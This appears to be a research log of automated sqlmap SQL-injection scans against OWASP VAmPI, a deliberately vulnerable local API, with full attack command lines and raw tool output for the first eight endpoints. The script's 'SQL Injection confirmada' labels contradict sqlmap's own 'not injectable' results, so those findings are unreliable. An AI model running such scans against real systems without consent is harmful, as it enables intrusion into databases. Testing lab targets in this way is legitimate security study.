@@ -1,0 +1,1055 @@
+================================================================================
+  SQLMAP - Teste Automatizado do OWASP VAmPI
+  (Vulnerable API on purpose)
+  Data:     2026-06-01 00:25:56
+  Base URL: http://localhost:5002
+  Level: 1 | Risk: 1
+  Token JWT: Sim
+  Total de endpoints: 21 (pulados: 0)
+================================================================================
+
+--------------------------------------------------------------------------------
+[1/21] Testando: home
+  Método:    GET
+  Path:      /
+  Descrição: Página inicial do VAmPI
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/"
+
+  [?] Resultado inconclusivo para home
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:25:56 /2026-06-01/
+  
+  [00:25:56] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:25:56] [INFO] loading tamper module 'space2comment'
+  [00:25:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:25:57] [INFO] flushing session file
+  [00:25:57] [INFO] testing connection to the target URL
+  [00:25:57] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:25:57] [INFO] testing if the target URL content is stable
+  [00:25:57] [INFO] target URL content is stable
+  [00:25:57] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  
+  [*] ending @ 00:25:57 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[2/21] Testando: createdb
+  Método:    GET
+  Path:      /createdb
+  Descrição: Criar e popular banco de dados com dados dummy
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/createdb"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em createdb
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:25:58 /2026-06-01/
+  
+  [00:25:58] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:25:58] [INFO] loading tamper module 'space2comment'
+  [00:25:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:25:58] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:25:58] [INFO] flushing session file
+  [00:25:58] [INFO] testing connection to the target URL
+  [00:25:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:25:58] [INFO] testing if the target URL content is stable
+  [00:25:58] [INFO] target URL content is stable
+  [00:25:58] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:25:58] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:25:58] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:25:58] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:25:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:25:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:25:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:25:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:25:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:25:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:25:59] [INFO] testing 'Generic inline queries'
+  [00:25:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:25:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:25:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:25:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:25:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:25:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:25:59] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:25:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:25:59] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:25:59] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:25:59] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:25:59 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[3/21] Testando: users_list
+  Método:    GET
+  Path:      /users/v1
+  Descrição: Listar todos os usuários (info básica)
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em users_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:25:59 /2026-06-01/
+  
+  [00:25:59] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:25:59] [INFO] loading tamper module 'space2comment'
+  [00:25:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:00] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:00] [INFO] flushing session file
+  [00:26:00] [INFO] testing connection to the target URL
+  [00:26:00] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:00] [INFO] testing if the target URL content is stable
+  [00:26:00] [INFO] target URL content is stable
+  [00:26:00] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:26:00] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:26:00] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:26:00] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:26:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:26:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:26:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:26:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:26:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:26:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:26:00] [INFO] testing 'Generic inline queries'
+  [00:26:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:26:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:26:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:26:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:26:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:26:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:26:00] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:26:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:26:00] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:26:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:26:00] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:26:00 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[4/21] Testando: users_debug
+  Método:    GET
+  Path:      /users/v1/_debug
+  Descrição: Listar todos os usuários (debug - todos os campos)
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/_debug"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em users_debug
+        -> SQL Injection confirmada
+        -> DBMS identificado
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:01 /2026-06-01/
+  
+  [00:26:01] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:01] [INFO] loading tamper module 'space2comment'
+  [00:26:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:01] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:01] [INFO] flushing session file
+  [00:26:01] [INFO] testing connection to the target URL
+  [00:26:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:01] [INFO] testing if the target URL content is stable
+  [00:26:02] [INFO] target URL content is stable
+  [00:26:02] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:26:02] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:26:02] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'SQLite')
+  [00:26:02] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
+  [00:26:02] [INFO] testing for SQL injection on URI parameter '#1*'
+  it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+  for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+  [00:26:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:26:02] [WARNING] reflective value(s) found and filtering out
+  [00:26:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:26:02] [INFO] testing 'Generic inline queries'
+  [00:26:02] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:02] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:03] [INFO] testing 'SQLite inline queries'
+  [00:26:03] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+  [00:26:03] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+  [00:26:03] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+  [00:26:03] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+  [00:26:04] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+  [00:26:04] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+  [00:26:04] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:26:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:26:04] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:26:04] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests
+  [00:26:04] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 405 times, 500 (Internal Server Error) - 2 times
+  
+  [*] ending @ 00:26:04 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[5/21] Testando: users_get_by_username
+  Método:    GET
+  Path:      /users/v1/name1
+  Descrição: Obter usuário por username (path param string)
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/name1"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em users_get_by_username
+        -> SQL Injection confirmada
+        -> DBMS identificado
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:04 /2026-06-01/
+  
+  [00:26:05] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:05] [INFO] loading tamper module 'space2comment'
+  [00:26:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:05] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:05] [INFO] flushing session file
+  [00:26:05] [INFO] testing connection to the target URL
+  [00:26:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:05] [INFO] testing if the target URL content is stable
+  [00:26:05] [INFO] target URL content is stable
+  [00:26:05] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:26:05] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:26:05] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'SQLite')
+  [00:26:05] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
+  [00:26:05] [INFO] testing for SQL injection on URI parameter '#1*'
+  it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+  for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+  [00:26:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:26:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:26:06] [INFO] testing 'Generic inline queries'
+  [00:26:06] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:06] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:06] [INFO] testing 'SQLite inline queries'
+  [00:26:06] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+  [00:26:06] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+  [00:26:07] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+  [00:26:07] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+  [00:26:07] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+  [00:26:07] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+  [00:26:07] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:26:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:26:07] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:26:07] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests
+  [00:26:07] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 400 times, 500 (Internal Server Error) - 2 times
+  
+  [*] ending @ 00:26:07 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[6/21] Testando: users_get_by_username_admin
+  Método:    GET
+  Path:      /users/v1/admin
+  Descrição: Obter usuário admin por username
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/admin"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em users_get_by_username_admin
+        -> SQL Injection confirmada
+        -> DBMS identificado
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:08 /2026-06-01/
+  
+  [00:26:08] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:08] [INFO] loading tamper module 'space2comment'
+  [00:26:08] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:08] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:08] [INFO] flushing session file
+  [00:26:08] [INFO] testing connection to the target URL
+  [00:26:08] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:08] [INFO] testing if the target URL content is stable
+  [00:26:09] [INFO] target URL content is stable
+  [00:26:09] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:26:09] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:26:09] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'SQLite')
+  [00:26:09] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
+  [00:26:09] [INFO] testing for SQL injection on URI parameter '#1*'
+  it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+  for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+  [00:26:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:26:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:26:09] [INFO] testing 'Generic inline queries'
+  [00:26:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:09] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+  [00:26:10] [INFO] testing 'SQLite inline queries'
+  [00:26:10] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+  [00:26:10] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+  [00:26:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+  [00:26:10] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+  [00:26:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+  [00:26:11] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+  [00:26:11] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:26:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:26:11] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:26:11] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests
+  [00:26:11] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 400 times, 500 (Internal Server Error) - 2 times
+  
+  [*] ending @ 00:26:11 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[7/21] Testando: users_get_by_username_inject
+  Método:    GET
+  Path:      /users/v1/testuser999
+  Descrição: Obter usuário inexistente (teste path param)
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/testuser999"
+
+  [?] Resultado inconclusivo para users_get_by_username_inject
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:11 /2026-06-01/
+  
+  [00:26:11] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:11] [INFO] loading tamper module 'space2comment'
+  [00:26:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:12] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:12] [INFO] flushing session file
+  [00:26:12] [INFO] testing connection to the target URL
+  [00:26:12] [CRITICAL] page not found (404)
+  it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
+  [00:26:12] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 1 times
+  
+  [*] ending @ 00:26:12 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[8/21] Testando: users_register
+  Método:    POST
+  Path:      /users/v1/register
+  Descrição: Registrar novo usuário
+  Auth:      Não
+  Body:      {"username": "sqlmap_test_user", "password": "testpass123", "email": "sqlmap@test.com"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/register" --method=POST --data='{"username": "sqlmap_test_user", "password": "testpass123", "email": "sqlmap@test.com"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para users_register
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:12 /2026-06-01/
+  
+  [00:26:12] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:12] [INFO] loading tamper module 'space2comment'
+  [00:26:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:12] [INFO] testing connection to the target URL
+  [00:26:12] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:12] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:12] [INFO] testing if the target URL content is stable
